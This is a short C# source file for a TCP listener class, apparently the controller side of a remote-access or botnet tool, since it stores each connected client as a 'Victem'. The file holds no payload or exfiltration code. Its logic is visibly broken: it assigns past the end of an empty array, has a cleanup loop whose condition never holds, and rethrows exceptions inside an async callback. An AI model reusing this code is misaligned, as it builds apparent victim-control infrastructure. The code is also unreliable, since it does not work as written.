using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;

namespace AllahNET.Server
{
    /// <summary>
    /// كيف تتحدث العربية بحق الجحيم؟
    /// </summary>
    public class TcpServer
    {
        public TcpListener __listn__ { get; set; }
        public object __tag__ { get; set; }
        public int __port__ { get; private set; }
        public Victem[] __victmes__ { get; private set; }

        public TcpServer(int _port_, object _tag_ = null)
        {
            __port__ = _port_;

            if (_tag_ != null)
                __tag__ = _tag_;

            __victmes__ = new Victem[] { };
        }

        public virtual void Start()
        {
            __listn__ = new TcpListener(new IPEndPoint(IPAddress.Any, __port__));
            __listn__.Start(500);

            __listn__.BeginAcceptTcpClient(ACPT, this);
        }

        public virtual void ACPT(IAsyncResult ar)
        {
            TcpServer _ = (TcpServer)ar.AsyncState;
            try
            {
                var __ = new Victem(_.__listn__.EndAcceptTcpClient(ar));
                __victmes__[__victmes__.Length + 1] = __;
            }
            catch (Exception ___)
            {
                throw ___;
            }
            finally
            {
                if (__listn__ != null)
                    __listn__.BeginAcceptTcpClient(ACPT, this);
            }
        }

        public virtual void DISP()
        {
            try
            {
                __listn__?.Stop();
                __listn__ = null;

                foreach (Victem _v_ in __victmes__)
                {
                    _v_.DISP();
                }

                for (int i = 0; i > __victmes__.Length; i++)
                {
                    __victmes__[i] = null;
                }

                __tag__ = null;
            } catch { }
        }
    }
}
